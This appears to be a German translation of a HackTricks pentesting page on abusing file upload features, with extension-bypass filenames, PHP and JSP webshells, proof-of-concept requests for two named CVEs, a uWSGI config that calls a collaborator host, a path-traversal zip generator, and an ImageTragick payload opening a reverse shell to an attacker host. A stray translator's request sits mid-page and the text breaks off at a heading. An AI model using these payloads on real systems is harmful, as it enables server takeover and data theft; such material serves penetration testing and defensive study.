# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Weitere nützliche Dateiendungen:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehen von Prüfungen der Dateiendungen

1. Wenn sie angewendet werden, **prüfe** die **vorherigen Dateiendungen.** Teste sie auch mit einigen **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Überprüfe **das Hinzufügen einer gültigen Erweiterung vor** der Ausführungs-Erweiterung (verwende auch die vorherigen Erweiterungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **Sonderzeichen am Ende hinzuzufügen.** Du könntest Burp verwenden, um alle **ascii** und **Unicode** Zeichen zu **bruteforce**. (_Beachte, dass du auch versuchen kannst, die **zuvor** genannten **Erweiterungen** zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Schutzmaßnahmen zu umgehen, indem du den serverseitigen **Parser für Dateiendungen täuschst** mit Techniken wie dem **Verdoppeln** der **Dateiendung** oder dem **Hinzufügen von Junk**-Daten (**null**-Bytes) zwischen den Erweiterungen. _Du kannst auch die **vorherigen Erweiterungen** verwenden, um ein besseres Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge **eine weitere Ebene von Dateiendungen** zur vorherigen Prüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die **ausführende Erweiterung vor die gültige Erweiterung** zu setzen und hoffe, dass der Server fehlkonfiguriert ist. (Nützlich, um Apache-Fehlkonfigurationen auszunutzen, bei denen alles mit der Erweiterung .php — aber nicht notwendigerweise mit .php endend — Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** unter **Windows**. In diesem Fall wird nach einer verbotenen Erweiterung und vor einer erlaubten eine Doppelpunkt-Zeichen ":" eingefügt. Dadurch wird eine **leere Datei mit der verbotenen Erweiterung** auf dem Server erstellt (z. B. "file.asax:.jpg”). Diese Datei kann später mit anderen Techniken bearbeitet werden, z. B. durch Verwendung ihres Kurzdateinamens. Das **::$data** Muster kann ebenfalls verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann es auch nützlich sein, nach diesem Muster einen Punkt anzuhängen, um weitere Beschränkungen zu umgehen (z. B. "file.asp::$data.").
8. Versuche, die Dateinamengrenzen zu überschreiten. Die gültige Erweiterung wird abgeschnitten und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Einige Upload-Handler trimmen oder normalisieren nachgestellte Punkte im gespeicherten Dateinamen. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) Versionen vor 2.9.1 kannst du die Erweiterungsvalidierung umgehen durch:

- Verwendung eines gültigen image-MIME und Magic-Headers (z. B. PNG’s `\x89PNG\r\n\x1a\n`).
- Benennung der hochgeladenen Datei mit einer PHP-Erweiterung gefolgt von einem Punkt, z. B. `shell.php.`.
- Der Server entfernt den nachgestellten Punkt und speichert `shell.php`, welche ausgeführt wird, wenn sie in einem vom Web bereitgestellten Verzeichnis liegt (Standard public storage wie `/storage/files/`).

Minimaler PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Rufe dann den gespeicherten Pfad auf (typisch in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Durchsetzen strenger serverseitiger allowlists und erneute Validierung des gespeicherten Dateinamens.
- Uploads aus nicht-exekutierbaren Speicherorten bereitstellen.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Um die **magic number**-Prüfung zu umgehen, füge am Anfang der Datei die **bytes of a real image** hinzu (verwirrt den _file_ command). Oder platziere die Shell in den **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder du könntest das Payload auch **direkt in ein Bild einfügen**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Wenn auf dein Bild **compression** angewendet wird, z. B. mit Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht nützlich. Du könntest jedoch den **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die Kompression **überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte das **image** auch **resizen**, z. B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Du könntest jedoch den **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die Kompression **überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das ein Bild-Resizing überlebt (z. B. mit der PHP-GD-Funktion `thumbnailImage`), ist die Nutzung des **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html), um Text einzufügen, der die Kompression **überlebt**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Finde eine Verwundbarkeit, um die bereits hochgeladene Datei zu **rename** (um die Extension zu ändern).
- Finde eine **Local File Inclusion**-Schwachstelle, um die Backdoor auszuführen.
- **Possible Information disclosure**:
1. Lade dieselbe Datei **mehrfach** (und zur **gleichen Zeit**) mit demselben Namen hoch.
2. Lade eine Datei hoch, deren **Name** mit dem einer bereits existierenden **Datei** oder **Ordner** übereinstimmt.
3. Hochladen einer Datei mit **"." , "..", oder "…" als Name**. Zum Beispiel: auf Apache unter **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis "/www/uploads/" speichert, erzeugt der Dateiname "." eine Datei namens "uploads" im Verzeichnis "/www/".
4. Lade eine Datei hoch, die sich nur schwer löschen lässt, z. B. **"…:.jpg"** unter **NTFS**. (Windows)
5. Lade in **Windows** eine Datei mit **ungültigen Zeichen** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade in **Windows** eine Datei mit **reservierten** (**verbotenen**) Namen wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
- Versuche auch, eine **ausführbare Datei** (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die beim versehentlichen Öffnen durch das Opfer **Code ausführt**.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` Dateien sind wie die `.jar` für java, aber für php, und können **wie eine php-Datei verwendet werden** (mit php ausgeführt oder in ein Script inkludiert...).

Die `.inc`-Extension wird manchmal für php-Dateien verwendet, die nur zum **Importieren von Dateien** dienen, daher könnte jemand diese Extension irgendwann zur **Ausführung erlaubt** haben.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Also, wie im folgenden Bild erwähnt, lade die XML-Datei nach `$JETTY_BASE/webapps/` hoch und erwarte die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE)-Schwachstellen lassen sich auf uWSGI-Servern ausnutzen, wenn man die Möglichkeit hat, die `.ini` Konfigurationsdatei zu verändern. uWSGI-Konfigurationsdateien verwenden eine spezielle Syntax, um "magic" Variablen, Platzhalter und Operatoren einzubinden. Insbesondere der '@' Operator, verwendet als `@(filename)`, dient dazu, den Inhalt einer Datei einzufügen. Unter den verschiedenen in uWSGI unterstützten schemes ist das "exec" scheme besonders mächtig, da es das Lesen von Daten aus der Standardausgabe eines Prozesses erlaubt. Diese Funktion kann für bösartige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read missbraucht werden, wenn eine `.ini` Konfigurationsdatei verarbeitet wird.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payloads erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (z. B. nach einem Crash oder wegen einer Denial of Service attack) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, wenn Änderungen festgestellt werden.

Es ist entscheidend, die lasche Art des Parsings der uWSGI-Konfigurationsdatei zu verstehen. Konkret kann der beschriebene payload in eine binäre Datei (z. B. ein Bild oder eine PDF) eingefügt werden, wodurch der mögliche Exploit-Bereich weiter vergrößert wird.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Ein unauthenticated endpoint in Gibbon LMS erlaubt arbitrary file write im web root, was zu pre-auth RCE durch Ablegen einer PHP-Datei führt. Verwundbare Versionen: bis einschließlich 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimaler PoC, um eine Datei zu schreiben und wieder auszulesen:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Eine minimale webshell ablegen und Befehle ausführen:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Hinweise:
- Der Handler führt `base64_decode($_POST["img"])` aus, nachdem er an `;` und `,` gesplittet wurde, und schreibt dann die Bytes nach `$absolutePath . '/' . $_POST['path']`, ohne die Dateiendung/den Typ zu validieren.
- Der daraus resultierende Code läuft als Webservice-Benutzer (z. B. XAMPP Apache unter Windows).

Referenzen für diesen Bug umfassen das usd HeroLab advisory und den NVD-Eintrag. Siehe den Abschnitt References unten.

## **wget File Upload/SSRF Trick**

In manchen Fällen stellst du möglicherweise fest, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen** und du die **URL** **angeben** kannst. In solchen Fällen prüft der Code möglicherweise, ob die Erweiterung der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien geladen werden. Allerdings kann **diese Prüfung umgangen werden.**\
Die **maximale** Länge eines **Dateinamens** in **linux** ist **255**, allerdings **kürzt** **wget** die Dateinamen auf **236** Zeichen. Du kannst **eine Datei namens "A"*232+".php"+".gif" herunterladen**, dieser Dateiname wird die **Prüfung** **umgehen** (in diesem Beispiel ist **".gif"** eine **gültige** Erweiterung), aber `wget` **benennt** die Datei in **"A"*232+".php"** um.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass **eine weitere Option**, die dir vielleicht einfällt, um diese Prüfung zu umgehen, darin besteht, den **HTTP-Server auf eine andere Datei umzuleiten**, sodass die ursprüngliche URL die Prüfung umgeht, aber wget dann die umgeleitete Datei mit dem neuen Namen herunterladen wird. Das **funktioniert nicht**, **es sei denn** wget mit dem **Parameter** `--trust-server-names` verwendet wird, weil **wget die umgeleitete Seite mit dem im ursprünglichen URL angegebenen Dateinamen herunterladen wird**.

### Ausbrechen aus dem Upload-Verzeichnis via NTFS junctions (Windows)

(Für diesen Angriff benötigst du lokalen Zugriff auf die Windows-Maschine) Wenn Uploads unter benutzerspezifischen Unterordnern auf Windows gespeichert werden (z. B. C:\Windows\Tasks\Uploads\<id>\) und du die Erstellung/Löschung dieses Unterordners kontrollierst, kannst du ihn durch eine directory junction ersetzen, die auf einen sensitiven Ort zeigt (z. B. das webroot). Nachfolgende Uploads werden in den Zielpfad geschrieben, was die Ausführung von Code ermöglicht, wenn das Ziel serverseitigen Code interpretiert.

Beispielablauf zum Umleiten von Uploads in das XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Hinweise
- mklink /J erstellt eine NTFS directory junction (reparse point). Das Konto des Webservers muss der Junction folgen und Schreibrechte im Ziel haben.
- Dies leitet beliebige Datei‑Schreibvorgänge um; falls das Ziel Skripte ausführt (PHP/ASP), wird daraus RCE.
- Gegenmaßnahmen: erlaube nicht, dass beschreibbare Upload‑Roots unter C:\Windows\Tasks oder ähnlichem attacker‑controllable sind; blockiere das Erstellen von Junctions; validiere extensions server‑side; speichere Uploads auf einem separaten Volume oder mit deny‑execute ACLs.

### GZIP-komprimierter Body-Upload + path traversal im destination param → JSP webshell RCE (Tomcat)

Einige Upload/ingest-Handler schreiben den rohen Request-Body in einen Dateisystempfad, der aus user-controlled Query-Parametern konstruiert wird. Unterstützt der Handler zudem Content-Encoding: gzip und versäumt es, den destination-Pfad zu kanonisieren/validieren, lassen sich directory traversal und eine gzip-komprimierte Payload kombinieren, um beliebige Bytes in ein web-served Verzeichnis zu schreiben und RCE zu erreichen (z. B. eine JSP in Tomcat’s webapps ablegen).

Generischer Exploit-Ablauf:
- Bereite deine server-side Payload vor (z. B. minimale JSP webshell) und gzip-komprimiere die Bytes.
- Sende einen POST, bei dem ein Pfadparameter (z. B. token) Traversal enthält, das aus dem vorgesehenen Ordner entkommt, und file den Dateinamen angibt, unter dem persistiert werden soll. Setze Content-Type: application/octet-stream und Content-Encoding: gzip; der Body ist die komprimierte Payload.
- Rufe die geschriebene Datei im Browser auf, um die Ausführung auszulösen.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Bitte fügen Sie den Inhalt von src/pentesting-web/file-upload/README.md ein, den ich ins Deutsche übersetzen soll.
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Hinweise
- Zielpfade variieren je nach Installation (z. B., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in einigen Stacks). Jeder web-exponierte Ordner, der JSP ausführt, funktioniert.
- Burp Suite’s Hackvertor-Erweiterung kann aus deinem payload einen korrekten gzip-Body erzeugen.
- Dies ist ein reines pre-auth arbitrary file write → RCE-Muster; es beruht nicht auf multipart parsing.

Gegenmaßnahmen
- Leiten Sie Upload-Ziele serverseitig ab; vertrauen Sie niemals Pfadfragmente von Clients.
- Kanonisieren und erzwingen Sie, dass der aufgelöste Pfad innerhalb eines allow-listed Basisverzeichnisses bleibt.
- Speichern Sie Uploads auf einem nicht-ausführbaren Volume und verweigern Sie die Skriptausführung aus beschreibbaren Pfaden.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Korruption von Upload-Indizes durch snprintf-Quirks (historisch)

Einige veraltete Upload-Handler, die `snprintf()` oder Ähnliches verwenden, um multi-file Arrays aus einem single-file Upload zu erstellen, können dazu gebracht werden, die `_FILES`-Struktur zu fälschen. Aufgrund von Inkonsistenzen und Abschneidung im Verhalten von `snprintf()` kann ein sorgfältig gestalteter Single-Upload auf der Serverseite als mehrere indizierte Dateien erscheinen und Logik verwirren, die eine feste Struktur annimmt (z. B. ihn als Multi-File Upload behandelt und unsichere Pfade nimmt). Obwohl heute Nische, taucht dieses “index corruption” Pattern gelegentlich in CTFs und älteren Codebasen wieder auf.

## Von File upload zu anderen Schwachstellen

- Setze **filename** auf `../../../tmp/lol.png` und versuche, einen **path traversal** zu erreichen
- Setze **filename** auf `sleep(10)-- -.jpg` und du könntest eine **SQL injection** erreichen
- Setze **filename** auf `<svg onload=alert(document.domain)>` um eine **XSS** zu erreichen
- Setze **filename** auf `; sleep 10;` um einige command injection Tests durchzuführen (mehr [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probiere **different svg payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn du den Webserver dazu veranlassen kannst, ein Bild von einer URL zu holen, könntest du versuchen, ein [SSRF](../ssrf-server-side-request-forgery/index.html) auszunutzen. Wenn dieses **image** auf einer **public** Seite **saved** wird, könntest du auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs zu XSS: Die [folgende Seite zeigt, wie man **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Wenn du PDFs hochladen kannst, könntest du ein PDF vorbereiten, das beliebiges JS ausführt, den dort gegebenen Hinweisen folgend.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Prüfe, ob es eine **size limit** beim Hochladen von Dateien gibt

Hier eine Top-10-Liste von Dingen, die du durch Upload erreichen kannst (von [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für andere Dateitypen.

## Zip/Tar-Datei, die beim Upload automatisch dekomprimiert wird

Wenn du ein ZIP hochladen kannst, das auf dem Server dekomprimiert wird, kannst du 2 Dinge tun:

### Symlink

Lade ein Archiv hoch, das symbolische Links auf andere Dateien enthält; beim Zugriff auf die dekomprimierten Dateien greifst du auf die verlinkten Dateien zu:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimieren in verschiedenen Ordnern

Die unerwartete Erstellung von Dateien in Verzeichnissen während der Dekomprimierung ist ein erhebliches Problem. Trotz anfänglicher Annahmen, dass diese Konfiguration vor OS-level command execution durch bösartige Datei-Uploads schützen könnte, können die hierarchische Komprimierungsunterstützung und die directory traversal-Fähigkeiten des ZIP-Archivformats ausgenutzt werden. Dadurch können Angreifer Beschränkungen umgehen und aus sicheren Upload-Verzeichnissen entkommen, indem sie die Dekomprimierungsfunktionalität der angegriffenen Anwendung manipulieren.

Ein automatisierter Exploit, um solche Dateien zu erzeugen, ist verfügbar unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Das Tool kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zusätzlich ist der **symlink trick with evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzugreifen, sollte in Ihrem System ein symlink auf diese Datei erstellt werden. Dies stellt sicher, dass evilarc während seiner Ausführung nicht auf Fehler stößt.

Unten ist ein Beispiel für Python-Code, der verwendet wird, um eine bösartige zip-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Missbrauch von Kompression für file spraying**

Für weitere Details **siehe den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-Code wird geschrieben, um Befehle aus der `$_REQUEST`-Variable auszuführen.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Mehrere Dateien werden erstellt und ein Zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die Namen der Dateien innerhalb des zip-Archivs werden mit vi oder einem Hex-Editor verändert, wobei "xxA" in "../" geändert wird, um Verzeichnisse zu traversieren.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Erweiterung hoch, um die Schwachstelle auszunutzen **(ImageMagick, 7.0.1-1)** (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP Shell in eine PNG

